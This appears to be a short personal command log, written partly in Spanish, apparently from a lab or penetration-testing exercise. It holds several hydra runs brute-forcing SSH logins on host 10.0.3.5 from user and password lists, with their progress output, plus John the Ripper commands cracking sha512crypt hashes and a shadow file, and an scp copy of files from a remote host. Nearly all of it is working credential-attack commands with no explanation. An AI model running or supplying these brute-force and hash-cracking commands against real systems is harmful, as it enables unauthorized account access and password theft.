scp -r fsi:~/archivos ./Laboratorios/miscelanea ordenada/COSAS HALLADAS/USUARIOS/ftp_surreta


hydra -C usuarios_mismatch.txt ssh://10.0.3.5 -t 9 -w 7.9 -v -o resultados_mismatch.txt -I
[STATUS] 167.00 tries/min, 167 tries in 00:01h, 2212 to do in 00:14h, 9 active

hydra -L usuarios.txt -P passwords_test.txt ssh://10.0.3.5 -t 4 -w 1.2 -v -f -o hydra_test.txt -I
[STATUS] 246.00 tries/min, 246 tries in 00:01h, 30681 to do in 02:05h, 4 active

../run/john --wordlist=dict.txt --rules=OneRuleToRuleThemStill --format=sha512crypt --fork=4 hashes.txt



sacar repetidos y ordenar
sort -u usuarios.txt -o usuarios.txt


hydra -L users.txt -P passwords_internos.txt ssh://10.0.3.5 -t 4 -w 1.2 -v -f -o hydra_test.txt -I


../run/john  --incremental shadow_jadrover.txt
